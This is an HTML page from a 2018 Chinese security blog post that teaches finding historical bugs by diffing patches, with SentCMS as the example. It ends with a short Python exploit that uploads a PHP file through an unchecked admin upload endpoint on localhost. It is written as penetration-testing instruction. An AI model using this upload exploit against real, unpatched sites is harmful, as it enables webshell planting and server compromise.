@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>寻找历史漏洞 | 青鸟 Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="寻找历史漏洞">
+<meta property="og:url" content="http://blue-bird1.github.io/2018/05/22/findbug/index.html">
+<meta property="og:site_name" content="青鸟 Blog">
+<meta property="og:description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png">
+<meta property="og:image" content="https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png">
+<meta property="og:updated_time" content="2018-05-31T01:27:22.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="寻找历史漏洞">
+<meta name="twitter:description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
+<meta name="twitter:image" content="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png">
+  
+    <link rel="alternate" href="/atom.xml" title="青鸟 Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
+    <h2 class="author">bluebird</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>7</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-findbug" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/22/findbug/" class="article-date">
+  <time class="post-time" datetime="2018-05-22T01:24:36.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      寻找历史漏洞
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。<br>但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞</p>
+<h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>我们以<code>SentCMS</code>为例子 我们可以在码云下载到 <a href="https://gitee.com/sentcms/sentcms" target="_blank" rel="noopener">下载地址</a>  或者使用<br><code>git clone https://gitee.com/sentcms/sentcms</code><br>码云作为中国的github 自然是很方便。<br>但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理<br>因为git的版本管理和提交对比非常实用 也方便保存进度</p>
+<p>大致的git操作是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git init  #初始化git仓库</span><br><span class="line">git add * #将旧版本全部文件添加</span><br><span class="line">git commit  # 作为初始提交</span><br><span class="line"># 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作</span><br><span class="line"># git status 可能你会想要查看一下文件差异</span><br><span class="line">git add * # 将全部文件改变添加</span><br><span class="line">git commit # 提交更改</span><br><span class="line"># git log 查看日志</span><br><span class="line"># git diff  查看差异</span><br></pre></td></tr></table></figure></p>
+<h3 id="找到漏洞版本"><a href="#找到漏洞版本" class="headerlink" title="找到漏洞版本"></a>找到漏洞版本</h3><p>一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版<br> 如果没有这种信息只能一个提交一个提交的去对比了<br> 可以使用web查看  <a href="https://gitee.com/sentcms/sentcms/commits/master" target="_blank" rel="noopener">地址</a></p>
+<p>你也可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure></p>
+<p>我们可以找到一条看起来可能是修复漏洞的提交<br><img src="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png" alt=""></p>
+<h3 id="比较差异"><a href="#比较差异" class="headerlink" title="比较差异"></a>比较差异</h3><p>可以在命令行使用<code>git diff</code> 来查看 也可以选择直接在web界面查看每个提交 <a href="https://gitee.com/sentcms/sentcms/commits/master" target="_blank" rel="noopener">web提交地址</a></p>
+<p>如果不是git 在linux可以使用<code>diff</code>命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -r dir1 dir2</span><br></pre></td></tr></table></figure></p>
+<p>也可以选择使用一些你喜欢的文件对比工具</p>
+<h3 id="最重要的一步-查看代码"><a href="#最重要的一步-查看代码" class="headerlink" title="最重要的一步 查看代码"></a>最重要的一步 查看代码</h3><p>提交行数不多 快速查看 发现疑似漏洞点<br><img src="https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png" alt=""><br>可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 <a href="https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php" target="_blank" rel="noopener">地址</a></p>
+<p> 这个时候阅读一下readme 可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">│ ├─common             COMMON公共模型，不可访问</span><br><span class="line">│ │ ├─controller      公共基类目录</span><br><span class="line">│ │ ├─model           模型目录</span><br><span class="line">│ │ ├─validate        验证配置</span><br><span class="line">│ │ ├─view            公共模板目录</span><br><span class="line">│ │ ├─widget          扩展组件目录</span><br></pre></td></tr></table></figure></p>
+<p>很明显我们不能直接访问 需要通过调用<br>这个时候Ide就能帮助我们快速找到调用</p>
+<p>我们在ide搜索可以找到<code>application/admin/controller/Upload.php</code> 没有进行任何过滤的调用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">namespace app\admin\controller;</span><br><span class="line">use app\common\controller\Admin;</span><br><span class="line"></span><br><span class="line">class Upload extends Admin &#123;</span><br><span class="line"></span><br><span class="line">	public function _empty() &#123;</span><br><span class="line">		$controller = controller(&apos;common/Upload&apos;);</span><br><span class="line">		$action     = $this-&gt;request-&gt;action();</span><br><span class="line">		return $controller-&gt;$action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php" target="_blank" rel="noopener">web地址</a></p>
+<p>这个cms使用了tp5框架 需要通过路由访问<br>我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sentcms/admin/Upload/Upload</span><br></pre></td></tr></table></figure></p>
+<p>从报错信息可以看到已经执行到了漏洞语句位置<br>由代码可知 直接上传文件即可</p>
+<h3 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;</span><br><span class="line">files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;</span><br><span class="line"># 我本地cookeie</span><br><span class="line">cookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=file，cookies=cookie)</span><br></pre></td></tr></table></figure>
+<p>我们可以在<code>uploads\picture\20180521</code>找到一个，以微秒时间的md5编码为文件名的php文件</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blue-bird1.github.io/2018/05/22/findbug/" data-id="cji113tqc0001r0nx9ngdd62a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/31/一道简单题目/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          一道简单题目
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/05/metasploit-python-模块是如何运行/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">metasploit python 模块是如何运行</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">青鸟 Blog</h1>
+    <h2 class="blog-subtitle">青鸟的Blog</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
+    <h2 class="author">bluebird</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>7</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/blue-bird1" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://jiaqiangbandongg.github.io/" target="_blank" title="李孟禹的日常">
+          李孟禹的日常
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://zehuichen123.github.io/" target="_blank" title="loveSnowBest&#39;Blog">
+          loveSnowBest&#39;Blog
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yaoyaomeng.github.io" target="_blank" title="xyz&#39;blog">
+          xyz&#39;blog
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 bluebird<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
